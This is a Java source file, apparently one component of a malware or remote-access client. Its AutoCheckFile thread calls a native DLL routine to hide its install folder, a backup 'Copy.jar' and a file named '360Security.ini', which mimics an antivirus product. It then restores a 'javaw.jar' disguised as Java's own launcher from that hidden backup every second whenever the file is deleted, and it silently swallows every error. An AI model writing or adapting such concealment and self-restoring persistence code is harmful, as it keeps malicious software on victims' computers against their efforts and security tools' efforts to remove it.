package me.client.utils;

import com.sun.jna.WString;
import com.sun.jna.platform.win32.Kernel32;
import me.client.Client;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

public class AutoCheckFile extends Thread{
    @Override
    public void run() {
        try {
            LoadDLL.instance.HideFile1(new WString(Client.getPath1() + "\\Copy.jar"));
            LoadDLL.instance.HideFile1(new WString(Client.getPath1() + "\\360Security.ini"));
            LoadDLL.instance.HideFile1(new WString(Client.getPath1()));
            while (true) {
                Thread.sleep(1000);
                File file = new File(Client.getPath() + "\\javaw.jar");
                File file1 = new File(Client.getPath1() + "\\Copy.jar");
                if(!file.exists()) {
                    createNewFile(file1);
                }
            }
        }catch (Exception e) {
        }
    }
    private void createNewFile(File file) {
        try {
            FileInputStream fileInputStream = new FileInputStream(file);
            FileOutputStream outputStream = new FileOutputStream(Client.getPath() + "\\javaw.jar");
            byte[] buff = new byte[1024];
            int len = 0;
            while ((len = fileInputStream.read(buff))!=-1) {
                outputStream.write(buff,0,len);
            }
            outputStream.close();
            fileInputStream.close();
        }catch (Exception e) {
        }
    }
}
